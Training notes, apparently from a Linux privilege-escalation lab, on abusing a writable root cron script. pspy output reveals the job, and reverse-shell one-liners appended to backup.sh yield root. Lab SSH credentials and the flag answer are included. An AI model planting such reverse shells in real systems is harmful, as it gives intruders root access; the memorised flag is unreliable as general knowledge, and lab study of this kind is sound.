# Cron Job Abuse
Look around the system for any writeable files or directories.

```sh
$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

[pspy](https://github.com/DominicBreuker/pspy) is a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).

Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan procfs every 1000ms (or every second).

```sh
$ ./pspy64 -pf -i 1000

pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService 
2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2020/09/04 20:45:03 CMD: UID=0    PID=99     | 
2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd 

<SNIP>

2020/09/04 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1010   | /usr/sbin/atd -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1003   | /usr/lib/accountsservice/accounts-daemon 
2020/09/04 20:45:03 CMD: UID=0    PID=1001   | /lib/systemd/systemd-logind 
2020/09/04 20:45:03 CMD: UID=0    PID=10     | 
2020/09/04 20:45:03 CMD: UID=0    PID=1      | /sbin/init 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2203   | 
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
```

From the above output, we can see that a cron job runs the `backup.sh` script located in the `/dmz-backups` directory and creating a tarball file of the contents of the `/var/www/html` directory.

Let's modify the script to add a Bash one-liner reverse shell.

```sh
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

We modify the script, stand up a local `netcat` listener, and wait. Sure enough, within three minutes, we have a root shell!

```sh
$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
bash: cannot set terminal process group (9143): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id
id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# hostname
hostname
NIX02
```

## Questions
SSH to 10.129.43.87 (ACADEMY-LPE-NIX02), with user `htb-student` and password `Academy_LLPE!`
1. Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the `flag.txt` file in the `/root/cron_abuse` directory. **Answer: 14347a2c977eb84508d3d50691a7ac4b**
   - Find writeable files → notice `backup.sh` is writeable:
        ```sh
        $ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
        /etc/cron.daily/backup
        /dmz-backups/backup.sh
        <SNIP>
        ```
   - Run pspy to view running processes → found out backup.sh is running as a cron job:
        ```sh
        $ ./pspy64 -pf -i 1000
        2026/06/14 06:02:01 CMD: UID=0     PID=2743   | /bin/bash /dmz-backups/backup.sh 
        2026/06/14 06:02:01 CMD: UID=0     PID=2742   | /bin/sh -c /dmz-backups/backup.sh 
        2026/06/14 06:02:01 CMD: UID=0     PID=2741   | /usr/sbin/CRON -f 
        2026/06/14 06:02:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
        2026/06/14 06:02:01 CMD: UID=0     PID=2745   | 
        2026/06/14 06:02:01 FS:                 OPEN | /usr/lib/locale/locale-archive
        2026/06/14 06:02:01 FS:                 OPEN | /usr/share/zoneinfo/Arctic/Longyearbyen
        2026/06/14 06:02:01 FS:               ACCESS | /usr/share/zoneinfo/Arctic/Longyearbyen
        2026/06/14 06:02:01 FS:        CLOSE_NOWRITE | /usr/share/zoneinfo/Arctic/Longyearbyen
        2026/06/14 06:02:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
        2026/06/14 06:02:01 CMD: UID=0     PID=2746   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-2026614-06:02:01.tgz /var/www/html 

        ```
   - Modify `backup.sh` with a one liner reverse shell and gain the shell via our listener:
        At victim, modify the `backup.sh` to connect back to our host IP:
        ```sh
        $ cat /dmz-backups/backup.sh 
        #!/bin/bash
        SRCDIR="/var/www/html"
        DESTDIR="/dmz-backups/"
        FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
        tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
        bash -i >& /dev/tcp/10.10.14.14/443 0>&1
        ```
        At host, start a listener:
        ```sh
        $ sudo nc -nlvp 443
        Listening on 0.0.0.0 443
        Connection received on 10.129.43.87 33432
        bash: cannot set terminal process group (2768): Inappropriate ioctl for device
        bash: no job control in this shell
        root@NIX02:~# cat /root/cron_abuse/flag.txt
        cat /root/cron_abuse/flag.txt
        14347a2c977eb84508d3d50691a7ac4b
        ```